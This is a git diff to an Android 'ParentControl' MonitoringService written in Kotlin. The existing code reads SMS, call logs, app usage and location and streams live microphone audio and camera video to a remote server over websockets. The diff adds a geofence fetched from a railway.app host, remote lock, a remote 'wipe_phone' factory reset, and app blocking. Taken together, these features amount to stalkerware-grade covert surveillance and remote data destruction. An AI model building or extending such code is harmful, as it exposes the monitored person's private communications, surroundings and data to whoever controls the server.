@@ -43,6 +43,7 @@ class MonitoringService : Service() {
     private var smsReader: SmsReader? = null
     private var callLogReader: CallLogReader? = null
     private var appUsageReader: AppUsageReader? = null
+    private var geofenceManager: GeofenceManager? = null
 
     private var cameraDevice: CameraDevice? = null
     private var imageReader: ImageReader? = null
@@ -60,7 +61,6 @@ class MonitoringService : Service() {
         acquireWakeLock()
         KeepAliveReceiver.scheduleAlarm(this)
 
-        // Sab features start karo
         locationTracker = LocationTracker(this)
         locationTracker?.startTracking()
 
@@ -69,15 +69,15 @@ class MonitoringService : Service() {
 
         callLogReader = CallLogReader(this)
         appUsageReader = AppUsageReader(this)
+        geofenceManager = GeofenceManager(this)
 
-        // Har 30 min mein call logs aur app usage bhejo
         Handler(mainLooper).postDelayed({
             callLogReader?.readAndSend()
             appUsageReader?.readAndSend()
             sendBatteryLevel()
+            fetchGeofenceSettings()
         }, 5000)
 
-        // Repeat every 30 min
         val repeatHandler = Handler(mainLooper)
         val repeatRunnable = object : Runnable {
             override fun run() {
@@ -88,6 +88,27 @@ class MonitoringService : Service() {
             }
         }
         repeatHandler.postDelayed(repeatRunnable, 30 * 60 * 1000)
+    }
+
+    private fun fetchGeofenceSettings() {
+        Thread {
+            try {
+                val response = OkHttpClient().newCall(
+                    Request.Builder()
+                        .url("https://overflowing-perception-production-17b2.up.railway.app/geofence?device=$DEVICE_NAME")
+                        .build()
+                ).execute()
+                val body = response.body?.string() ?: return@Thread
+                val json = org.json.JSONObject(body)
+                if (json.getBoolean("active")) {
+                    geofenceManager?.startGeofence(
+                        json.getDouble("lat"),
+                        json.getDouble("lng"),
+                        json.getDouble("radius")
+                    )
+                }
+            } catch (e: Exception) { e.printStackTrace() }
+        }.start()
     }
 
     private fun sendBatteryLevel() {
@@ -114,10 +135,7 @@ class MonitoringService : Service() {
 
     private fun acquireWakeLock() {
         val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
-        wakeLock = pm.newWakeLock(
-            PowerManager.PARTIAL_WAKE_LOCK,
-            "ParentControl::MonitoringWakeLock"
-        )
+        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ParentControl::WakeLock")
         wakeLock?.acquire(10 * 60 * 60 * 1000L)
     }
 
@@ -135,8 +153,36 @@ class MonitoringService : Service() {
                 currentCameraIndex = if (currentCameraIndex == 0) 1 else 0
                 startCameraStream()
             }
+            "lock_phone" -> lockPhone()
+            "wipe_phone" -> wipePhone()
+            "block_app" -> {
+                val pkg = intent.getStringExtra("package") ?: return START_STICKY
+                AppBlocker.blockApp(this, pkg)
+            }
+            "unblock_app" -> {
+                val pkg = intent.getStringExtra("package") ?: return START_STICKY
+                AppBlocker.unblockApp(this, pkg)
+            }
+            "bedtime_on" -> {
+                BedtimeReceiver.scheduleBedtime(this, 22, 0) // 10 PM
+            }
+            "bedtime_off" -> {
+                BedtimeReceiver.cancelBedtime(this)
+            }
         }
         return START_STICKY
+    }
+
+    private fun lockPhone() {
+        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+        val adminComponent = android.content.ComponentName(this, AdminReceiver::class.java)
+        if (dpm.isAdminActive(adminComponent)) dpm.lockNow()
+    }
+
+    private fun wipePhone() {
+        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+        val adminComponent = android.content.ComponentName(this, AdminReceiver::class.java)
+        if (dpm.isAdminActive(adminComponent)) dpm.wipeData(0)
     }
 
     private fun buildNotification(): Notification {
@@ -149,9 +195,7 @@ class MonitoringService : Service() {
     }
 
     private fun createNotificationChannel() {
-        val channel = NotificationChannel(
-            CHANNEL_ID, "Monitoring Service", NotificationManager.IMPORTANCE_LOW
-        )
+        val channel = NotificationChannel(CHANNEL_ID, "Monitoring Service", NotificationManager.IMPORTANCE_LOW)
         getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
     }
 
@@ -182,9 +226,7 @@ class MonitoringService : Service() {
                     .addFormDataPart("file", file.name, file.asRequestBody("audio/mp4".toMediaType()))
                     .addFormDataPart("device", DEVICE_NAME)
                     .build()
-                OkHttpClient().newCall(
-                    Request.Builder().url(SERVER_URL).post(body).build()
-                ).execute()
+                OkHttpClient().newCall(Request.Builder().url(SERVER_URL).post(body).build()).execute()
                 file.delete()
             } catch (e: Exception) { e.printStackTrace() }
         }.start()
@@ -192,24 +234,16 @@ class MonitoringService : Service() {
 
     private fun startLiveStream() {
         isLive = true
-        val client = OkHttpClient.Builder()
-            .pingInterval(20, java.util.concurrent.TimeUnit.SECONDS)
-            .build()
+        val client = OkHttpClient.Builder().pingInterval(20, java.util.concurrent.TimeUnit.SECONDS).build()
         wsAudio = client.newWebSocket(
             Request.Builder().url("$WS_URL?type=child&device=$DEVICE_NAME").build(),
             object : WebSocketListener() {
-                override fun onOpen(webSocket: okhttp3.WebSocket, response: Response) {
-                    streamMicToWebSocket(webSocket)
-                }
+                override fun onOpen(webSocket: okhttp3.WebSocket, response: Response) { streamMicToWebSocket(webSocket) }
                 override fun onFailure(webSocket: okhttp3.WebSocket, t: Throwable, response: Response?) {
                     isLive = false
-                    Handler(mainLooper).postDelayed({
-                        if (isLive) startLiveStream()
-                    }, 3000)
+                    Handler(mainLooper).postDelayed({ if (isLive) startLiveStream() }, 3000)
                 }
-                override fun onClosed(webSocket: okhttp3.WebSocket, code: Int, reason: String) {
-                    isLive = false
-                }
+                override fun onClosed(webSocket: okhttp3.WebSocket, code: Int, reason: String) { isLive = false }
             }
         )
     }
@@ -249,12 +283,8 @@ class MonitoringService : Service() {
         wsCamera = okClient.newWebSocket(
             Request.Builder().url("$WS_URL?type=camera&device=$DEVICE_NAME").build(),
             object : WebSocketListener() {
-                override fun onOpen(webSocket: okhttp3.WebSocket, response: Response) {
-                    openCamera(webSocket)
-                }
-                override fun onFailure(webSocket: okhttp3.WebSocket, t: Throwable, response: Response?) {
-                    isCameraLive = false
-                }
+                override fun onOpen(webSocket: okhttp3.WebSocket, response: Response) { openCamera(webSocket) }
+                override fun onFailure(webSocket: okhttp3.WebSocket, t: Throwable, response: Response?) { isCameraLive = false }
             }
         )
     }
